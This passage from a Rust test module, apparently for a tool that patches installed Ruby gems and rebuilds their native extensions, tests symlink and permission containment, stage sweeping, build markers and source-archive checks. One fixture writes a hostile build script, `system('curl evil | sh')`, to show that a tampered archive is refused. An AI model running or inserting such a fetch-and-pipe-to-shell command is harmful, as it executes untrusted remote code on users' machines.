                .collect();
            Preflight {
                installed,
                candidates,
                require_paths: vec!["lib".to_string()],
            }
        };

        // No extension dirs in the home: its dir name carries the ABI.
        let ruby = fake_platform_ruby(&bin.join("a"), "arm64-darwin-25", "3.4.0", "yes");
        let probe = find_fresh_platform_ruby(&copy, &env, &preflight(vec![ruby.clone()]))
            .await
            .unwrap();
        assert_eq!(probe.ruby, ruby);
        assert_eq!(probe.lib_dir, copy.gem_dir.join("lib"));
        assert_eq!(
            probe.facts.as_ref().and_then(RubyFacts::minor).as_deref(),
            Some("3.4")
        );
        assert_eq!(
            std::fs::read_to_string(bin.join("a/calls")).unwrap(),
            format!("extensions_dir {} arm64-darwin\n", home.display()),
            "the probe names the gem home and the gem's platform, nothing of the gem"
        );
        let other_abi = fake_platform_ruby(&bin.join("b"), "arm64-darwin-25", "3.3.0", "yes");
        let why = find_fresh_platform_ruby(&copy, &env, &preflight(vec![other_abi.clone()]))
            .await
            .unwrap_err();
        assert!(why.contains("another Ruby ABI"), "{why}");
        // The first candidate that owns the home is the one.
        let both = preflight(vec![other_abi, ruby.clone()]);
        let probe = find_fresh_platform_ruby(&copy, &env, &both).await.unwrap();
        assert_eq!(probe.ruby, ruby);

        // A Ruby that does not run the gem's platform.
        let foreign = fake_platform_ruby(&bin.join("c"), "x86_64-linux", "3.4.0", "no");
        let why = find_fresh_platform_ruby(&copy, &env, &preflight(vec![foreign]))
            .await
            .unwrap_err();
        assert!(why.contains("does not run arm64-darwin gems"), "{why}");

        // The home's other native gems were built for 3.4.0, under an OS
        // release's platform dir this Ruby no longer spells the same way.
        std::fs::create_dir_all(home.join("extensions/arm64-darwin-24/3.4.0/racc-1.8.1")).unwrap();
        let probe = find_fresh_platform_ruby(&copy, &env, &preflight(vec![ruby.clone()]))
            .await
            .unwrap();
        assert_eq!(probe.ruby, ruby);
        let static_ruby =
            fake_platform_ruby(&bin.join("d"), "arm64-darwin-25", "3.4.0-static", "yes");
        let why = find_fresh_platform_ruby(&copy, &env, &preflight(vec![static_ruby]))
            .await
            .unwrap_err();
        assert!(why.contains("another Ruby ABI"), "{why}");
    }

    /// A release variant is matched to an installed copy by a file it
    /// replaces. A build input of the ruby-platform record that a native
    /// copy does not hold is not such a file: the copy was built (or
    /// shipped prebuilt), it is not another gem. Records and copies nothing
    /// here rebuilds from the source gem keep every file.
    #[tokio::test]
    async fn absent_build_inputs_do_not_decide_the_installed_variant() {
        let tmp = tempfile::tempdir().unwrap();
        let copy = precompiled_gem(&tmp.path().join("home"));
        let record: HashMap<String, PatchFileInfo> = [
            ("ext/a/a.c".to_string(), info(&"c".repeat(64))),
            ("patches/0001.patch".to_string(), info(&"d".repeat(64))),
            ("lib/a/gone.rb".to_string(), info(&"e".repeat(64))),
        ]
        .into();
        let keys = |files: &HashMap<String, PatchFileInfo>| {
            let mut keys: Vec<String> = files.keys().cloned().collect();
            keys.sort();
            keys
        };
        // The source gem's record, qualified or not: the input the copy
        // never shipped is left out; a missing Ruby file still tells.
        for purl in ["pkg:gem/a@1", "pkg:gem/a@1?platform=ruby"] {
            let telling = discriminating_files(&copy.gem_dir, purl, &record).await;
            assert_eq!(keys(&telling), ["ext/a/a.c", "lib/a/gone.rb"], "{purl}");
        }
        // Another platform's record, and another ecosystem's.
        for purl in [
            "pkg:gem/a@1?platform=java",
            "pkg:gem/a@1?platform=arm64-darwin",
            "pkg:pypi/a@1",
        ] {
            let telling = discriminating_files(&copy.gem_dir, purl, &record).await;
            assert_eq!(keys(&telling), keys(&record), "{purl}");
        }

        // A gem RubyGems built, whose build removed an input.
        let built = installed_gem(&tmp.path().join("built"), "lib");
        let removed: HashMap<String, PatchFileInfo> =
            [("ports/value.txt".to_string(), info(&"c".repeat(64)))].into();
        let telling = discriminating_files(&built.gem_dir, "pkg:gem/a@1", &removed).await;
        assert!(telling.is_empty(), "{:?}", keys(&telling));

        // The JRuby build is another archive of the same release: a C
        // build input of the ruby record it does not ship says nothing
        // about it. A file it ships tells, and so does a Ruby file it
        // lacks (`a_jvm_copy_is_judged_by_the_files_it_takes`).
        let java = jvm_gem(&tmp.path().join("java"));
        let telling = discriminating_files(&java.gem_dir, "pkg:gem/a@1", &record).await;
        assert_eq!(keys(&telling), ["ext/a/a.c", "lib/a/gone.rb"]);
    }

    /// A gem tree can come from the repository being scanned, so nothing in
    /// it may steer a delete: a link planted where the stage dir goes (to
    /// the home's own `gems/`, or to a dir outside it) is neither swept
    /// through nor staged into. The dir named `<gem>-<version>` behind the
    /// link stays.
    #[cfg(unix)]
    #[test]
    fn a_planted_stage_link_steers_no_delete() {
        let tmp = tempfile::tempdir().unwrap();
        let outside = tmp.path().join("outside");
        std::fs::create_dir_all(outside.join("a-1")).unwrap();
        std::fs::write(outside.join("a-1/keep"), b"x").unwrap();
        for (case, target) in [
            ("the home's gems dir", PathBuf::from("gems")),
            ("a dir outside the home", outside.clone()),
        ] {
            let home = tmp.path().join(case.replace([' ', '\''], "_"));
            let copy = installed_gem(&home, "lib");
            std::fs::write(copy.gem_dir.join("lib/a.rb"), b"x").unwrap();
            std::os::unix::fs::symlink(&target, home.join(BUILD_STAGE_DIR)).unwrap();

            // The start of every native apply, gem rollback and refresh.
            assert!(
                !recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap(),
                "{case}"
            );
            sweep_stale_stage(&copy).unwrap();
            assert!(
                copy.gem_dir.join("lib/a.rb").is_file(),
                "{case}: the gem was deleted"
            );
            assert!(outside.join("a-1/keep").is_file(), "{case}");
            assert!(
                crate::utils::containment::is_link(&home.join(BUILD_STAGE_DIR)),
                "{case}: the link is left"
            );
            let why = open_stage(&copy).err().unwrap().describe();
            assert!(why.contains("is not a directory"), "{case}: {why}");
            assert!(copy.gem_dir.join("lib/a.rb").is_file(), "{case}");
            assert!(outside.join("a-1/keep").is_file(), "{case}");
        }

        // The stage dir itself as a link, under a real stage root.
        let home = tmp.path().join("leaf");
        let copy = installed_gem(&home, "lib");
        std::fs::create_dir_all(home.join(BUILD_STAGE_DIR)).unwrap();
        std::os::unix::fs::symlink(outside.join("a-1"), stage_root(&copy)).unwrap();
        sweep_stale_stage(&copy).unwrap();
        assert!(outside.join("a-1/keep").is_file());
        assert!(open_stage(&copy).is_err());
        assert!(outside.join("a-1/keep").is_file());
    }

    /// Only "not found" says a path holds nothing. One that cannot be
    /// probed (a parent that is a file; a directory that may not be
    /// searched) may hold a planted link, so it is refused like one: the
    /// stage is neither swept nor opened, a backup is not restored through,
    /// and a file the own-source proof cannot look at proves nothing. Each
    /// refusal names the path.
    #[cfg(unix)]
    #[tokio::test]
    async fn an_unprobeable_path_is_never_taken_for_a_real_one() {
        use std::os::unix::fs::PermissionsExt;
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let copy = installed_gem(&home, "lib");
        std::fs::write(copy.gem_dir.join("lib/a.rb"), b"x").unwrap();

        let link = tmp.path().join("link");
        std::os::unix::fs::symlink(&home, &link).unwrap();
        let why = refuse_link(&link, "an extension dir").unwrap_err();
        assert!(
            why.to_string()
                .contains("is a symlink, not an extension dir"),
            "{why}"
        );
        refuse_link(&tmp.path().join("missing"), "a dir").unwrap();
        refuse_link(&home, "a dir").unwrap();
        // ENOTDIR: a file where a directory is named.
        let through_file = copy.gem_dir.join("lib/a.rb/below");
        let why = refuse_link(&through_file, "a dir").unwrap_err().to_string();
        assert!(
            why.contains("lib/a.rb/below") && why.contains("could not be checked"),
            "{why}"
        );

        // Root searches any directory: the rest needs a user.
        if unsafe { libc::geteuid() } == 0 {
            eprintln!("skipping the unreadable-directory cases: running as root");
            return;
        }
        let mode = |path: &Path, mode: u32| {
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap()
        };

        // A stage a dead run left, in a gem home that may not be searched.
        let root = stage_root(&copy);
        std::fs::create_dir_all(root.join("home")).unwrap();
        std::fs::write(root.join("home/half"), b"x").unwrap();
        mode(&home, 0o000);
        let named = stage_dirs(&copy);
        let swept = sweep_stale_stage(&copy);
        let opened = open_stage(&copy).map(|_| ()).map_err(|e| e.describe());
        mode(&home, 0o755);
        for why in [named.unwrap_err(), opened.unwrap_err()] {
            assert!(
                why.contains(BUILD_STAGE_DIR)
                    && why.contains("could not be checked")
                    && why.contains("ermission denied"),
                "{why}"
            );
        }
        swept.unwrap();
        assert!(
            root.join("home/half").is_file(),
            "an unverified stage was swept"
        );

        // A file the installed copy holds, where it cannot be looked at: the
        // archive's differs, and the proof must not pass on the rest.
        let (installed, staged) = (tmp.path().join("installed"), tmp.path().join("staged"));
        for (tree, lib) in [(&installed, "theirs"), (&staged, "ours")] {
            std::fs::create_dir_all(tree.join("lib")).unwrap();
            std::fs::create_dir_all(tree.join("ext/a")).unwrap();
            std::fs::write(tree.join("lib/a.rb"), lib).unwrap();
            std::fs::write(tree.join("ext/a/a.c"), b"int a;").unwrap();
        }
        mode(&installed.join("lib"), 0o000);
        let proved = prove_own_source(&installed, &staged, &HashMap::new());
        mode(&installed.join("lib"), 0o755);
        let why = proved.unwrap_err();
        assert!(
            why.contains("lib/a.rb") && why.contains("could not be checked"),
            "{why}"
        );
        let why = prove_own_source(&installed, &staged, &HashMap::new()).unwrap_err();
        assert!(why.contains("lib/a.rb differs"), "{why}");

        // A gem dir that may not be searched: whether it holds a backup (or
        // a link planted where one goes) cannot be told, so rollback does
        // not report the copy as carrying none.
        let env = RubyEnv {
            cwd: tmp.path().to_path_buf(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        mode(&copy.gem_dir, 0o000);
        let restored = restore_original_build(&copy.gem_dir, &env).await;
        mode(&copy.gem_dir, 0o755);
        let why = restored.unwrap_err();
        assert!(
            why.contains(BACKUP_DIR)
                && why.contains("could not be checked")
                && why.contains("gem pristine a"),
            "{why}"
        );
        assert_eq!(restore_original_build(&copy.gem_dir, &env).await, Ok(false));

        // A backup dir that may not be searched: its description cannot be
        // probed, so the backup is not taken for missing (which would have
        // rollback rebuild in place over it, or report nothing to restore).
        let backup = copy.gem_dir.join(BACKUP_DIR);
        std::fs::create_dir_all(&backup).unwrap();
        std::fs::write(backup.join(BACKUP_INFO), b"{}").unwrap();
        mode(&backup, 0o000);
        let restored = restore_original_build(&copy.gem_dir, &env).await;
        mode(&backup, 0o755);
        let why = restored.unwrap_err();
        assert!(
            why.contains(BACKUP_INFO)
                && why.contains("could not be checked")
                && why.contains("gem pristine a"),
            "{why}"
        );
        assert!(backup.join(BACKUP_INFO).is_file());
    }

    /// A marker that is there and cannot be read is not "no marker": a
    /// rollback with no backup to restore does not report such a copy as
    /// carrying nothing. With no marker file at all, it does.
    #[tokio::test]
    async fn a_marker_that_cannot_be_read_is_not_taken_for_none() {
        let tmp = tempfile::tempdir().unwrap();
        let copy = installed_gem(&tmp.path().join("home"), "lib");
        let env = RubyEnv {
            cwd: tmp.path().to_path_buf(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        assert_eq!(read_marker_strict(&copy.gem_dir).unwrap(), None);
        assert_eq!(restore_original_build(&copy.gem_dir, &env).await, Ok(false));

        let marker = copy.gem_dir.join(MARKER_FILE);
        for unreadable in [
            "not json".to_string(),
            // A schema this version does not know.
            serde_json::json!({ "schema": 99, "sources": {} }).to_string(),
        ] {
            std::fs::write(&marker, &unreadable).unwrap();
            assert_eq!(read_marker_sync(&copy.gem_dir), None);
            let why = restore_original_build(&copy.gem_dir, &env)
                .await
                .unwrap_err();
            assert!(
                why.contains(MARKER_FILE)
                    && why.contains("could not be read as a build marker")
                    && why.contains("gem pristine a"),
                "{unreadable}: {why}"
            );
            assert!(marker.is_file(), "the marker is left");
        }
    }

    /// Where a directory cannot be locked, nothing vouches that a stage is
    /// dead: one whose heartbeat is younger than any live step lasts is
    /// left to the run that may still be building in it, and the purl is
    /// refused until it is older.
    #[test]
    fn an_unlockable_stage_is_swept_only_when_provably_dead() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let copy = installed_gem(&home, "lib");
        let root = stage_root(&copy);
        std::fs::create_dir_all(root.join("home/gems/a-1")).unwrap();
        std::fs::write(root.join("home/gems/a-1/half"), b"x").unwrap();
        std::fs::write(root.join(STAGE_HEARTBEAT), b"").unwrap();
        let unlockable = |_: &Path| -> std::io::Result<Option<std::fs::File>> { Ok(None) };

        let refused = sweep_stale_stage_with(&copy, unlockable).unwrap_err();
        assert_eq!(refused.kind(), std::io::ErrorKind::WouldBlock);
        assert!(
            root.join("home/gems/a-1/half").is_file(),
            "a live stage was swept"
        );
        let why = recovery_refusal(&copy, &refused);
        assert!(why.contains("cannot be locked here"), "{why}");

        // The heartbeat and the dir both older than any step of a build.
        let long_ago = std::time::SystemTime::now() - UNLOCKED_STAGE_AGE - Duration::from_secs(60);
        for path in [root.join(STAGE_HEARTBEAT), root.clone()] {
            let times = std::fs::FileTimes::new().set_modified(long_ago);
            // A directory opens for this on Unix; elsewhere the heartbeat
            // file alone is aged, and the dir's own time still holds it.
            if let Ok(file) = std::fs::File::open(&path) {
                let _ = file.set_times(times);
            }
        }
        #[cfg(unix)]
        assert!(unlocked_stage_is_dead(&root), "an aged stage is dead");
        if unlocked_stage_is_dead(&root) {
            sweep_stale_stage_with(&copy, unlockable).unwrap();
            assert!(!root.exists(), "a dead stage is swept");
            assert!(!home.join(BUILD_STAGE_DIR).exists());
        }
        // A stage with no heartbeat at all is judged by its dir alone.
        std::fs::create_dir_all(&root).unwrap();
        assert!(!unlocked_stage_is_dead(&root));
    }

    /// A grafted copy is held to what a normal install is: the build is
    /// for the Ruby that made it. It is attested as soon as its marker
    /// holds, in a gem home that names no Ruby too, whatever binaries the
    /// gem ships for other Rubies. A second Ruby's `apply` adds its binary
    /// to the same marker and backup; a grafted binary that no longer
    /// hashes as built attests nothing; rollback restores every one.
    #[tokio::test]
    async fn a_grafted_copy_is_attested_from_its_first_graft() {
        let tmp = tempfile::tempdir().unwrap();
        // No ABI in its name, no compiled gem in it: any Ruby's home.
        let home = tmp.path().join("gems-home");
        let copy = precompiled_gem(&home);
        assert_eq!(home_minor(&copy), None);
        let (for_33, for_34) = (
            copy.gem_dir.join("lib/a/3.3/a.bundle"),
            copy.gem_dir.join("lib/a/3.4/a.bundle"),
        );
        let record: HashMap<String, PatchFileInfo> = [(
            "ext/a/a.c".to_string(),
            PatchFileInfo {
                before_hash: compute_git_sha256_from_bytes(b"int a;"),
                after_hash: "c".repeat(64),
            },
        )]
        .into();
        let scope = InstalledGem::at(&copy.gem_dir).await.scope(&record);
        assert_eq!(built_state(&copy, &scope, &record), Built::No);

        // Ruby 3.4 runs `apply`: attested from here on.
        let staged = staged_build(
            &tmp.path().join("stage34"),
            &["a/a.bundle"],
            b"built by 3.4",
        );
        let grafts = plan_graft(&copy, &probe_for(&copy, "3.4.10"), &staged).unwrap();
        assert!(back_up_prebuilt(&copy, &grafts, &[]).unwrap());
        graft_binaries(&copy, &scope, &record, &grafts).unwrap();
        assert_eq!(std::fs::read(&for_33).unwrap(), PREBUILT);
        assert_eq!(
            verify_native_build(&copy.gem_dir, "pkg:gem/a@1", &record).await,
            Ok(())
        );
        // Another Ruby may be the one running `apply` next: it is asked.
        assert_eq!(
            built_state(&copy, &scope, &record),
            Built::ForRubies(vec!["3.4".to_string()])
        );

        // Ruby 3.3 runs `apply`: its binary joins the marker and the backup.
        let staged = staged_build(
            &tmp.path().join("stage33"),
            &["a/a.bundle"],
            b"built by 3.3",
        );
        let grafts = plan_graft(&copy, &probe_for(&copy, "3.3.6"), &staged).unwrap();
        assert!(!back_up_prebuilt(&copy, &grafts, &[]).unwrap());
        graft_binaries(&copy, &scope, &record, &grafts).unwrap();
        assert_eq!(std::fs::read(&for_33).unwrap(), b"built by 3.3");
        assert_eq!(std::fs::read(&for_34).unwrap(), b"built by 3.4");
        let marker = read_marker_sync(&copy.gem_dir).unwrap();
        assert_eq!(
            marker.lib_artifacts.keys().collect::<Vec<_>>(),
            ["lib/a/3.3/a.bundle", "lib/a/3.4/a.bundle"]
        );
        assert_eq!(
            verify_native_build(&copy.gem_dir, "pkg:gem/a@1", &record).await,
            Ok(())
        );
        // Every binary the gem ships is grafted: no Ruby is left to ask.
        assert_eq!(built_state(&copy, &scope, &record), Built::Yes);

        // A grafted binary that is no longer the built one (the gem was
        // reinstalled over it): the marker attests nothing.
        std::fs::write(&for_33, PREBUILT).unwrap();
        assert_eq!(
            verify_native_build(&copy.gem_dir, "pkg:gem/a@1", &record).await,
            Err(NOT_REBUILT_REASON.to_string())
        );
        assert_eq!(built_state(&copy, &scope, &record), Built::No);
        std::fs::write(&for_33, b"built by 3.3").unwrap();

        let env = RubyEnv {
            cwd: home.clone(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        assert_eq!(restore_original_build(&copy.gem_dir, &env).await, Ok(true));
        for binary in [&for_33, &for_34] {
            assert_eq!(
                std::fs::read(binary).unwrap(),
                PREBUILT,
                "{}",
                binary.display()
            );
        }
    }

    /// A copy built from these sources starts no Ruby on the next `apply`,
    /// with one exception: a grafted copy whose gem ships a binary for
    /// another Ruby that may be sharing its gem home. A home laid out for
    /// the Ruby already grafted is shared with no other.
    #[test]
    fn a_ruby_is_asked_only_when_another_may_share_the_home() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("gems-home");
        let copy = precompiled_gem(&home);
        let after = "c".repeat(64);
        let record: HashMap<String, PatchFileInfo> =
            [("ext/a/a.c".to_string(), info(&after))].into();
        let scope = NativeScope {
            inputs: vec!["ext/a/a.c".into()],
            precompiled: Some("arm64-darwin".into()),
            ..NativeScope::default()
        };
        let prebuilt = compute_git_sha256_from_bytes(PREBUILT);
        let graft = |minors: &[&str]| {
            let marker = BuildMarker {
                schema: GRAFT_MARKER_SCHEMA,
                sources: [("ext/a/a.c".to_string(), after.clone())].into(),
                lib_artifacts: minors
                    .iter()
                    .map(|minor| (format!("lib/a/{minor}/a.bundle"), prebuilt.clone()))
                    .collect(),
                grafted: true,
                ..BuildMarker::default()
            };
            write_marker(&copy, &marker).unwrap();
        };
        assert_eq!(
            prebuilt_siblings(&copy.gem_dir, "lib/a/3.4/a.bundle"),
            ["lib/a/3.3/a.bundle"]
        );
        assert!(prebuilt_siblings(&copy.gem_dir, "lib/a.bundle").is_empty());

        // A home that names no Ruby: the gem ships a binary for 3.3 too.
        graft(&["3.4"]);
        assert_eq!(home_minor(&copy), None);
        assert_eq!(
            built_state(&copy, &scope, &record),
            Built::ForRubies(vec!["3.4".to_string()])
        );
        graft(&["3.3", "3.4"]);
        assert_eq!(built_state(&copy, &scope, &record), Built::Yes);

        // Another gem's extension, built for 3.4, makes it that Ruby's home.
        std::fs::create_dir_all(home.join("extensions/arm64-darwin-24/3.4.0/racc-1.8.1")).unwrap();
        assert_eq!(home_minor(&copy).as_deref(), Some("3.4"));
        graft(&["3.4"]);
        assert_eq!(built_state(&copy, &scope, &record), Built::Yes);
        // Grafted for a Ruby that is not the home's: the home's is asked.
        graft(&["3.3"]);
        assert_eq!(
            built_state(&copy, &scope, &record),
            Built::ForRubies(vec!["3.3".to_string()])
        );
        // A second ABI in the home: no longer one Ruby's.
        std::fs::create_dir_all(home.join("extensions/arm64-darwin-24/3.3.0/racc-1.8.1")).unwrap();
        assert_eq!(home_minor(&copy), None);
        graft(&["3.4"]);
        assert_eq!(
            built_state(&copy, &scope, &record),
            Built::ForRubies(vec!["3.4".to_string()])
        );
        // Another record than the marker's: nothing is built yet.
        let other: HashMap<String, PatchFileInfo> =
            [("ext/a/a.c".to_string(), info(&"d".repeat(64)))].into();
        assert_eq!(built_state(&copy, &scope, &other), Built::No);

        assert_eq!(ruby_minor("3.4.0-static").as_deref(), Some("3.4"));
        assert_eq!(ruby_minor("3.4.10").as_deref(), Some("3.4"));
        assert_eq!(ruby_minor("ruby"), None);
    }

    /// The archive a rebuild starts from is found by name and version. It
    /// is built only when it is the installed copy's own source: every
    /// file the two share is the same, a file of the record aside.
    #[test]
    fn an_archive_must_be_the_installed_gems_own_source() {
        let tmp = tempfile::tempdir().unwrap();
        let (installed, staged) = (tmp.path().join("installed"), tmp.path().join("staged"));
        let lay = |root: &Path, files: &[(&str, &str)]| {
            for (rel, text) in files {
                let path = root.join(rel);
                std::fs::create_dir_all(path.parent().unwrap()).unwrap();
                std::fs::write(path, text).unwrap();
            }
        };
        // The source gem: what the installed copy has, and the build
        // inputs it lost or never shipped.
        lay(
            &staged,
            &[
                ("lib/a.rb", "module A; end\n"),
                ("ext/a/a.c", "int a = 1;\n"),
                ("ext/a/extconf.rb", "require 'mkmf'\n"),
                ("ports/value.txt", "40\n"),
            ],
        );
        lay(
            &installed,
            &[
                ("lib/a.rb", "module A; end\n"),
                ("ext/a/a.c", "int a = 1;\n"),
                ("ext/a/extconf.rb", "require 'mkmf'\n"),
                ("ext/a/Makefile", "all:\n"),
                ("lib/a/a.so", "built"),
            ],
        );
        let none = HashMap::new();
        assert_eq!(prove_own_source(&installed, &staged, &none), Ok(3));

        // A record file may hold what the record writes, or content the
        // run's mismatch policy answers for.
        let after = "int a = 2;\n";
        let record: HashMap<String, PatchFileInfo> = [(
            "ext/a/a.c".to_string(),
            PatchFileInfo {
                before_hash: compute_git_sha256_from_bytes(b"int a = 1;\n"),
                after_hash: compute_git_sha256_from_bytes(after.as_bytes()),
            },
        )]
        .into();
        std::fs::write(installed.join("ext/a/a.c"), after).unwrap();
        assert_eq!(
            prove_own_source(&installed, &staged, &none),
            Err("ext/a/a.c differs from the installed gem's".to_string())
        );
        assert_eq!(prove_own_source(&installed, &staged, &record), Ok(3));
        std::fs::write(installed.join("ext/a/a.c"), "int a = 9;\n").unwrap();
        assert_eq!(prove_own_source(&installed, &staged, &record), Ok(2));
        // The installed file is what the record replaces; the archive's is
        // something else.
        std::fs::write(installed.join("ext/a/a.c"), "int a = 1;\n").unwrap();
        std::fs::write(staged.join("ext/a/a.c"), "int a = 7;\n").unwrap();
        assert_eq!(
            prove_own_source(&installed, &staged, &record),
            Err("ext/a/a.c differs from the installed gem's".to_string())
        );
        std::fs::write(staged.join("ext/a/a.c"), "int a = 1;\n").unwrap();

        // Another gem of the same name: a build script that differs, with
        // a record that only adds a file to say nothing about it.
        let adds: HashMap<String, PatchFileInfo> = [(
            "patches/0100-fix.patch".to_string(),
            PatchFileInfo {
                before_hash: String::new(),
                after_hash: "c".repeat(64),
            },
        )]
        .into();
        std::fs::write(installed.join("ext/a/a.c"), "int a = 1;\n").unwrap();
        std::fs::write(
            staged.join("ext/a/extconf.rb"),
            "system('curl evil | sh')\n",
        )
        .unwrap();
        assert_eq!(
            prove_own_source(&installed, &staged, &adds),
            Err("ext/a/extconf.rb differs from the installed gem's".to_string())
        );
        // Nothing in common at all.
        let other = tmp.path().join("other");
        lay(
            &other,
            &[("lib/other.rb", "x"), ("ext/other/extconf.rb", "y")],
        );
        let why = prove_own_source(&installed, &other, &adds).unwrap_err();
        assert!(why.contains("shares no file"), "{why}");
        // A dir where the archive packs a file.
        std::fs::remove_file(installed.join("lib/a.rb")).unwrap();
        std::fs::create_dir_all(installed.join("lib/a.rb")).unwrap();
        std::fs::write(staged.join("ext/a/extconf.rb"), "require 'mkmf'\n").unwrap();
        let why = prove_own_source(&installed, &staged, &none).unwrap_err();
        assert!(why.contains("lib/a.rb is not a file"), "{why}");
    }

    /// What a staged build leaves in its own tree that Ruby could load,
    /// and that is no copy of an extension-dir artifact, cannot be moved in
    /// with the extension dir: an FFI gem's library in `ext/`, a rake
    /// build's in `lib/`, a generated Ruby file. A build dir `make clean`
    /// left full is none of that.
    #[test]
    fn a_build_that_leaves_its_library_in_the_tree_is_seen() {
        let tmp = tempfile::tempdir().unwrap();
        let copy = installed_gem(&tmp.path().join("home"), "lib");
        let probe = probe_for(&copy, "3.4.10");
        let built = staged_build(&tmp.path().join("stage"), &["a/a.bundle"], b"ext");
        let gem = &built.gem.gem_dir;
        std::fs::create_dir_all(gem.join("ext/a")).unwrap();
        std::fs::write(gem.join("lib/a.rb"), b"packed").unwrap();
        std::fs::write(gem.join("ext/a/a.c"), b"packed").unwrap();
        let before = loadable_files(gem, &probe.require_paths, Some("bundle"));
        assert_eq!(
            before.keys().collect::<Vec<_>>(),
            ["lib/a.rb", "lib/a/a.bundle"],
            "what Ruby could load: the require path's files"
        );
        // As built from: the `lib/` copy was not there yet.
        let before: BTreeMap<String, String> = before
            .into_iter()
            .filter(|(rel, _)| rel == "lib/a.rb")
            .collect();

        // The usual build: the extension dir, its `lib/` copy, objects, a
        // Makefile, and the linked extension `make clean` did not remove.
        std::fs::write(gem.join("ext/a/Makefile"), b"all:\n").unwrap();
        std::fs::write(gem.join("ext/a/a.o"), b"object").unwrap();
        std::fs::write(gem.join("ext/a/a.bundle"), b"ext").unwrap();
        assert_eq!(
            in_tree_products(&built, &before, &probe),
            Vec::<String>::new()
        );

        // A library of its own in `ext/`, as an FFI gem loads it.
        std::fs::write(gem.join("ext/a/liba_wrap.so"), b"wrapped").unwrap();
        assert_eq!(
            in_tree_products(&built, &before, &probe),
            ["ext/a/liba_wrap.so"]
        );
        std::fs::remove_file(gem.join("ext/a/liba_wrap.so")).unwrap();
        // A Ruby file the build wrote or rewrote under the require path.
        std::fs::write(gem.join("lib/a.rb"), b"regenerated").unwrap();
        std::fs::write(gem.join("lib/a_config.rb"), b"generated").unwrap();
        assert_eq!(
            in_tree_products(&built, &before, &probe),
            ["lib/a.rb", "lib/a_config.rb"]
        );
        for name in ["a.so", "a.bundle", "liba.dylib", "a.DLL", "liba.so.1.2"] {
            assert!(is_library_name(name, None), "{name}");
        }
        for name in ["a.o", "a.a", "so", "a.rb", "also.txt"] {
            assert!(!is_library_name(name, None), "{name}");
        }
        assert!(is_library_name("a.sl", Some("sl")));
    }

    /// A record written for a platform names it in its purl; the `ruby`
    /// record and another platform's do not.
    #[tokio::test]
    async fn a_platform_record_is_matched_to_its_own_copies() {
        let tmp = tempfile::tempdir().unwrap();
        let precompiled = precompiled_gem(&tmp.path().join("ruby/3.4.0"));
        assert_eq!(
            copy_platform(&precompiled.gem_dir).await.as_deref(),
            Some("arm64-darwin")
        );
        let built = installed_gem(&tmp.path().join("built"), "lib");
        assert_eq!(copy_platform(&built.gem_dir).await, None);
        assert_eq!(copy_platform(tmp.path()).await, None);

        assert!(names_platform(
            "pkg:gem/a@1?platform=arm64-darwin",
            "arm64-darwin"
        ));
        assert!(names_platform(
            "pkg:gem/a@1?platform=x86_64-linux-gnu",
            "x86_64-linux"
        ));
        assert!(names_platform(
            "pkg:gem/a@1?platform=X86_64-linux",
            "x86_64-linux-gnu"
        ));
        for other in [
            "pkg:gem/a@1",
            "pkg:gem/a@1?platform=ruby",
            "pkg:gem/a@1?platform=java",
            "pkg:gem/a@1?platform=x86_64-linux-musl",
        ] {
            assert!(!names_platform(other, "x86_64-linux"), "{other}");
        }
    }

    // ── an in-place build over the gem's own tree ───────────────────────

    /// A gem that builds a library into its own tree and loads it from
    /// there (scrypt, digest-crc): its extension dir holds no artifact.
    fn in_tree_gem(home: &Path) -> (GemCopy, Probe) {
        let copy = installed_gem(home, "lib");
        let probe = probe_for(&copy, "3.4.10");
        std::fs::write(probe.extension_dir.join(BUILD_COMPLETE), b"").unwrap();
        for (rel, bytes) in [
            ("ext/a/a.c", "patched source"),
            ("ext/a/liba.bundle", "original library"),
            ("ext/a/a.o", "original object"),
            ("ext/a/Makefile", "makefile"),
            ("lib/a.rb", "ruby"),
        ] {
            let path = copy.gem_dir.join(rel);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, bytes).unwrap();
        }
        (copy, probe)
    }

    /// Every file under `dir`, with its bytes.
    fn tree_bytes(dir: &Path) -> BTreeMap<String, Vec<u8>> {
        tree_files(dir)
            .into_iter()
            .map(|rel| {
                let bytes = std::fs::read(dir.join(&rel)).unwrap();
                (rel, bytes)
            })
            .collect()
    }

    /// What a build run in the installed tree does there: a library and an
    /// object replaced, a file removed, a file added, and a fresh
    /// extension dir with no artifact in it.
    fn build_in_tree(copy: &GemCopy, probe: &Probe) {
        std::fs::write(copy.gem_dir.join("ext/a/liba.bundle"), b"built library").unwrap();
        std::fs::write(copy.gem_dir.join("ext/a/a.o"), b"built object").unwrap();
        std::fs::remove_file(copy.gem_dir.join("ext/a/Makefile")).unwrap();
        std::fs::write(copy.gem_dir.join("ext/a/mkmf.log"), b"log").unwrap();
        std::fs::create_dir_all(&probe.extension_dir).unwrap();
        std::fs::write(probe.extension_dir.join(BUILD_COMPLETE), b"").unwrap();
    }

    /// The record's files, as a snapshot leaves them out.
    fn record_paths() -> Vec<String> {
        vec!["ext/a/a.c".to_string()]
    }

    fn in_tree_scope() -> (NativeScope, HashMap<String, PatchFileInfo>) {
        let scope = NativeScope {
            inputs: vec!["ext/a/a.c".into()],
            builds_extensions: true,
            ..NativeScope::default()
        };
        (scope, files(&["ext/a/a.c"]))
    }

    /// The library an in-place build replaces in the gem's own tree is
    /// backed up, attested by the marker, and put back by the restore with
    /// everything else the build did there (#2104).
    #[test]
    fn an_in_place_build_of_the_gems_own_tree_is_recorded_and_restored() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let (scope, record) = in_tree_scope();
        let installed = (tree_bytes(&copy.gem_dir), tree_bytes(&probe.extension_dir));

        assert!(back_up_original(&copy, &probe, &[]).unwrap());
        let aside = set_aside(&copy, &probe).unwrap();
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        build_in_tree(&copy, &probe);
        let changes = tree_changes(&copy, &snapshot);
        assert_eq!(
            changes,
            TreeChanges {
                replaced: vec![
                    "ext/a/Makefile".to_string(),
                    "ext/a/a.o".to_string(),
                    "ext/a/liba.bundle".to_string(),
